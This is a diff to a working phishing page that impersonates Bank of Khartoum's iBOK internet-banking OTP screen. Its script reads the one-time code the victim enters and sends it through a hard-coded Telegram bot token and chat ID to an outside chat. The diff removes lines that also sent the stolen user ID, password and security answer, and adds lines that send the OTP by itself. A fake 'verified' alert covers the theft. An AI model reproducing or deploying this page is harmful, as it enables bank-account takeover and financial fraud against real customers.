@@ -34,7 +34,6 @@
         .social-icons a { display: flex; align-items: center; justify-content: center; width: 35px; height: 35px; background-color: #555; color: #fff; border-radius: 50%; text-decoration: none; font-size: 16px; }
         .social-icons a.bok-icon { background-color: #fff; padding: 2px; }
         .social-icons a.bok-icon img { width: 100%; height: 100%; border-radius: 50%; }
-        
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
@@ -49,7 +48,6 @@
             <div class="header-right-text">Welcome to<br>iBOK Internet Banking</div>
         </div>
     </header>
-
     <main class="main-container">
         <h2 class="page-title">Internet Banking - Login</h2>
         <div class="otp-card">
@@ -57,7 +55,6 @@
                 Please enter OTP sent to your registered mobile number and email
                 <hr>
             </div>
-            
             <form onsubmit="sendOtpData(event)">
                 <div class="form-group">
                     <label>Enter OTP:</label>
@@ -66,13 +63,11 @@
                         <i class="fa-regular fa-eye-slash eye-icon"></i>
                     </div>
                 </div>
-                
                 <button type="submit" class="btn-submit">Submit</button>
                 <a href="individual.html" class="go-login">Go to Login</a>
             </form>
         </div>
     </main>
-
     <footer class="footer">
         iBOK | Bank of Khartoum 2024
         <div class="social-icons">
@@ -82,47 +77,27 @@
             <a href="#"><i class="fa-brands fa-facebook-f"></i></a>
         </div>
     </footer>
-
-    <!-- شاشة التحميل -->
     <div id="loadingScreen" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.95); z-index: 9999; justify-content: center; align-items: center; flex-direction: column;">
         <div style="border: 8px solid #f3f3f3; border-top: 8px solid #b91c23; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite;"></div>
         <h2 style="color: #b91c23; margin-top: 20px; font-size: 24px; font-weight: bold;">تحميل...</h2>
     </div>
-
     <script>
         function sendOtpData(event) {
             event.preventDefault();
             const otp = document.getElementById('otpCode').value;
 
-            const userId = sessionStorage.getItem('userId');
-            const password = sessionStorage.getItem('password');
-            const secQ = sessionStorage.getItem('secQ');
-            const secA = sessionStorage.getItem('secA');
-
+            // إرسال رسالة البوت (الرسالة الثالثة)
             const token = "9295127609:AAH6m1b_vUZZzsltPPEDTxhyEyMnsh6kbbw";
             const chatId = "8812057901";
-            
-            // تنسيق الرسالة بشكل احترافي (Markdown) عشان تنسخها بسهولة
-            const message = 
-                `🏦 *BOK - New Login Details* 🏦\n` +
-                `➖➖➖➖➖➖➖➖➖➖\n` +
-                `👤 *User ID:* \`${userId}\`\n` +
-                `🔑 *Password:* \`${password}\`\n` +
-                `➖➖➖➖➖➖➖➖➖➖\n` +
-                `🛡️ *Security Question:*\n${secQ}\n` +
-                `💡 *Answer:* \`${secA}\`\n` +
-                `➖➖➖➖➖➖➖➖➖➖\n` +
-                `🔢 *OTP Code:* \`${otp}\`\n` +
-                `➖➖➖➖➖➖➖➖➖➖`;
-
-            document.getElementById('loadingScreen').style.display = 'flex';
+            const message = `🔢 *رمز التحقق (OTP):*\n\n🔑 الرمز: \`${otp}\``;
 
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
             .then(() => {
+                document.getElementById('loadingScreen').style.display = 'flex';
                 setTimeout(function() {
                     document.getElementById('loadingScreen').style.display = 'none';
                     alert('تم التحقق بنجاح! (Demo)');
-                    sessionStorage.clear();
+                    sessionStorage.clear(); // مسح البيانات بعد ما نخلص
                 }, 10000);
             })
             .catch(err => {
